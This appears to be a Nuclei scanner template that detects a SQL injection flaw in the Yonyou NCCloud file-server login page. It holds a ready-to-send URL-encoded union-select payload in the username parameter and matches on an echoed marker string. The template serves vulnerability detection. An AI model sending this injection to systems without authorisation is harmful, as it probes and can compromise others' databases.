id: nccloud-fs-sqli

info:
  name: 用友NCCloud(YONYOU)- SQL注入漏洞
  author: wintry
  severity: critical
  description: 用友NCCloud存在文件服务器管理登录页面,username参数存在SQL注入漏洞.
  remediation: 升级到最新版本.
  tags: nccloud
  metadata:
    max-request: 1

http:
  - raw:
      - |
        GET /fs/console?username=%61%25%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%27%25%27%2b%27%71%61%78%6e%62%27%2b%27&password=%2F7Go4Iv2Xqlml0WjkQvrvzX%2FgBopF8XnfWPUk69fZs0%3D HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Cookie: JSESSIONID=2CF7A25EE7F77A064A9DA55456B6994D.server; JSESSIONID=0F83D6A0F3D65B8CD4C26DFEE4FCBC3C.server
        Connection: close


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "qaxnb"

      - type: status
        status:
          - 200
